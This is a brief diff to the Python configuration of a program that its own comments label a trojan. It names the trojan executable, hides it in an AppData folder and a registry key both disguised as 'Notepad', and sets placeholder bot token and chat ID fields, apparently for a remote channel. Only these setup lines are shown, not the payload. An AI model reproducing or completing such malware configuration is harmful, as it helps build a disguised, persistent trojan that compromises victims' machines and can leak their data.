@@ -1,11 +1,11 @@
 import os
 
 
-
+APPNAME = "XUVZ.exe" #Trojan Name
 DIRNAME = "Notepad" #Trojan Folder Name
 NAMEOFREGKEY = "Notepad" #Registry Key to be named
-TOKEN = "YOUR TOKEN"
-CHAT_ID = "YOUR CHATID"
+TOKEN = "Your Token"
+CHAT_ID = "Your ChatID"
 
 
 APPDATADIR = os.getenv("Appdata")+f"\\{DIRNAME}"
